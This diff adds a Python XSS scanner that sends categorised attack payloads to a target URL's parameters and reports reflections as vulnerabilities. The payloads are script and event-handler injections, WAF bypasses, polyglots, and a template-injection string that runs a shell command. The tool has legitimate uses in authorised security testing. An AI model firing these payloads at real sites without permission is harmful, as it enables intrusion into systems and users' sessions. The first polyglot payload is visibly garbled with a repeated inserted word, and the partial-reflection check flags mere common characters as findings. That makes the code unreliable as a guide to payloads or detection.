@@ -1,0 +1,306 @@
+#!/usr/bin/env python3
+"""xsser - Cross-Site Scripting (XSS) vulnerability scanner."""
+
+import sys
+import json
+import argparse
+import re
+import random
+import string
+import requests
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from html.parser import HTMLParser
+import warnings
+warnings.filterwarnings('ignore')
+
+
+# XSS Payloads organized by context
+PAYLOADS = {
+    'basic': [
+        '<script>alert(1)</script>',
+        '<img src=x onerror=alert(1)>',
+        '<svg onload=alert(1)>',
+        '"><script>alert(1)</script>',
+        "'><script>alert(1)</script>",
+        '<body onload=alert(1)>',
+        '<input onfocus=alert(1) autofocus>',
+        '<details open ontoggle=alert(1)>',
+        '<marquee onstart=alert(1)>',
+    ],
+    'attribute': [
+        '" onmouseover="alert(1)',
+        "' onmouseover='alert(1)",
+        '" onfocus="alert(1)" autofocus="',
+        "' onfocus='alert(1)' autofocus='",
+        '" onclick="alert(1)',
+        "javascript:alert(1)",
+    ],
+    'template': [
+        '{{7*7}}',
+        '${7*7}',
+        '{%import os%}{{os.popen("id").read()}}',
+        '{{constructor.constructor("return this")()}}',
+        '<%=7*7%>',
+    ],
+    'waf_bypass': [
+        '<scr<script>ipt>alert(1)</scr</script>ipt>',
+        '<img/src=x onerror=alert(1)>',
+        '<svg/onload=alert(1)>',
+        '"><img src=x onerror=prompt(1)>',
+        '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
+        '<svg><script>alert&#40;1&#41;</script>',
+        '<a href="javascript:alert(1)">click</a>',
+        '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
+    ],
+    'dom': [
+        '#<script>alert(1)</script>',
+        'javascript:alert(document.domain)',
+        'data:text/html,<script>alert(1)</script>',
+    ],
+    'polyglot': [
+        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik//oNcliCk=alert()//%0telerik1%22telerik>%3Ctelerik/%3Ctelerik/telerik/oNcliCk=alert()//>",
+        "'-alert(1)-'",
+        "'-alert(1)//",
+        "\"-alert(1)-\"",
+        "\\'-alert(1)//",
+    ],
+}
+
+
+def generate_canary():
+    """Generate a unique canary string for reflection detection."""
+    return 'xss' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+
+
+class ReflectionAnalyzer(HTMLParser):
+    """Analyze where a canary is reflected in HTML."""
+
+    def __init__(self, canary):
+        super().__init__()
+        self.canary = canary
+        self.contexts = []
+
+    def handle_starttag(self, tag, attrs):
+        for attr_name, attr_value in attrs:
+            if attr_value and self.canary in str(attr_value):
+                self.contexts.append(f'attribute:{tag}.{attr_name}')
+
+    def handle_data(self, data):
+        if self.canary in data:
+            self.contexts.append('html_body')
+
+    def handle_comment(self, data):
+        if self.canary in data:
+            self.contexts.append('html_comment')
+
+
+def detect_reflection(url, param, method, headers, verify):
+    """Detect if and where a parameter is reflected."""
+    canary = generate_canary()
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query, keep_blank_values=True)
+
+    if param in params:
+        params[param] = [canary]
+    else:
+        params[param] = [canary]
+
+    test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
+
+    try:
+        if method == 'GET':
+            resp = requests.get(test_url, headers=headers, timeout=10, verify=verify)
+        else:
+            data = {param: canary}
+            resp = requests.post(url, data=data, headers=headers, timeout=10, verify=verify)
+
+        if canary in resp.text:
+            analyzer = ReflectionAnalyzer(canary)
+            try:
+                analyzer.feed(resp.text)
+            except Exception:
+                pass
+
+            contexts = analyzer.contexts if analyzer.contexts else ['unknown']
+            return {
+                'reflected': True,
+                'contexts': contexts,
+                'status': resp.status_code,
+                'canary': canary,
+            }
+    except Exception:
+        pass
+
+    return {'reflected': False, 'contexts': [], 'status': None, 'canary': canary}
+
+
+def test_payload(url, param, payload, method, headers, verify):
+    """Test a specific XSS payload."""
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query, keep_blank_values=True)
+    params[param] = [payload]
+    test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
+
+    try:
+        if method == 'GET':
+            resp = requests.get(test_url, headers=headers, timeout=10, verify=verify)
+        else:
+            data = {param: payload}
+            resp = requests.post(url, data=data, headers=headers, timeout=10, verify=verify)
+
+        # Check if payload is reflected unmodified
+        if payload in resp.text:
+            return {
+                'vulnerable': True,
+                'payload': payload,
+                'param': param,
+                'url': test_url,
+                'status': resp.status_code,
+                'type': 'reflected (unfiltered)',
+            }
+
+        # Check for partial reflection (some chars encoded)
+        # Check if key XSS characters are present
+        key_chars = ['<', '>', '"', "'", '(', ')']
+        reflected_chars = sum(1 for c in key_chars if c in resp.text and c in payload)
+        if reflected_chars >= 3:
+            return {
+                'vulnerable': True,
+                'payload': payload,
+                'param': param,
+                'url': test_url,
+                'status': resp.status_code,
+                'type': 'reflected (partial filtering)',
+            }
+
+    except Exception:
+        pass
+
+    return None
+
+
+def scan_url(url, method, headers, verify, payload_types, threads):
+    """Scan a URL for XSS vulnerabilities."""
+    results = {
+        'url': url,
+        'reflections': [],
+        'vulnerabilities': [],
+    }
+
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query, keep_blank_values=True)
+
+    if not params:
+        results['error'] = 'No parameters found in URL'
+        return results
+
+    # Step 1: Detect reflections
+    for param in params:
+        reflection = detect_reflection(url, param, method, headers, verify)
+        if reflection['reflected']:
+            results['reflections'].append({
+                'param': param,
+                'contexts': reflection['contexts'],
+            })
+
+    # Step 2: Test payloads on reflected params
+    payloads = []
+    for ptype in payload_types:
+        payloads.extend(PAYLOADS.get(ptype, []))
+
+    if not payloads:
+        payloads = PAYLOADS['basic']
+
+    reflected_params = [r['param'] for r in results['reflections']]
+    if not reflected_params:
+        reflected_params = list(params.keys())  # Test all if none reflected
+
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = []
+        for param in reflected_params:
+            for payload in payloads:
+                futures.append(
+                    executor.submit(test_payload, url, param, payload, method, headers, verify)
+                )
+
+        for future in as_completed(futures):
+            result = future.result()
+            if result:
+                results['vulnerabilities'].append(result)
+
+    return results
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='XSS vulnerability scanner',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog='Examples:\n'
+               '  xsser -u "http://target.com/page?q=test"\n'
+               '  xsser -u "http://target.com/search?q=test" --payloads waf_bypass\n'
+               '  cat urls.txt | xsser --stdin\n'
+               '  xsser -u "http://target.com/page?q=test" --post'
+    )
+    parser.add_argument('-u', '--url', help='Target URL with parameters')
+    parser.add_argument('--stdin', action='store_true', help='Read URLs from stdin')
+    parser.add_argument('--post', action='store_true', help='Use POST method')
+    parser.add_argument('--payloads', nargs='+',
+                        choices=['basic', 'attribute', 'template', 'waf_bypass', 'dom', 'polyglot'],
+                        default=['basic'], help='Payload categories to test')
+    parser.add_argument('-t', '--threads', type=int, default=5, help='Threads (default: 5)')
+    parser.add_argument('-H', '--header', action='append', default=[], help='Custom header')
+    parser.add_argument('-k', '--insecure', action='store_true', help='Skip SSL verification')
+    parser.add_argument('-j', '--json', action='store_true', help='JSON output')
+    parser.add_argument('--reflect-only', action='store_true', help='Only detect reflections')
+    args = parser.parse_args()
+
+    urls = []
+    if args.url:
+        urls.append(args.url)
+    elif args.stdin or not sys.stdin.isatty():
+        urls = [line.strip() for line in sys.stdin if line.strip()]
+    else:
+        parser.print_help()
+        sys.exit(1)
+
+    method = 'POST' if args.post else 'GET'
+    verify = not args.insecure
+
+    headers = {'User-Agent': 'xsser-hexstrike/1.0'}
+    for h in args.header:
+        key, _, value = h.partition(':')
+        headers[key.strip()] = value.strip()
+
+    all_results = []
+    for url in urls:
+        print(f"[*] Scanning: {url}", file=sys.stderr)
+        result = scan_url(url, method, headers, verify, args.payloads, args.threads)
+        all_results.append(result)
+
+        if not args.json:
+            if result.get('error'):
+                print(f"[!] {result['error']}")
+                continue
+
+            if result['reflections']:
+                print(f"\n[REFLECTIONS] ({len(result['reflections'])} params)")
+                for r in result['reflections']:
+                    print(f"  {r['param']}: {', '.join(r['contexts'])}")
+
+            if not args.reflect_only and result['vulnerabilities']:
+                print(f"\n[VULNERABILITIES] ({len(result['vulnerabilities'])} found)")
+                for v in result['vulnerabilities']:
+                    print(f"  [+] {v['type']}")
+                    print(f"      Param:   {v['param']}")
+                    print(f"      Payload: {v['payload']}")
+                    print(f"      URL:     {v['url']}")
+            elif not args.reflect_only:
+                print(f"[-] No XSS vulnerabilities confirmed")
+
+    if args.json:
+        print(json.dumps(all_results if len(all_results) > 1 else all_results[0], indent=2))
+
+
+if __name__ == '__main__':
+    main()
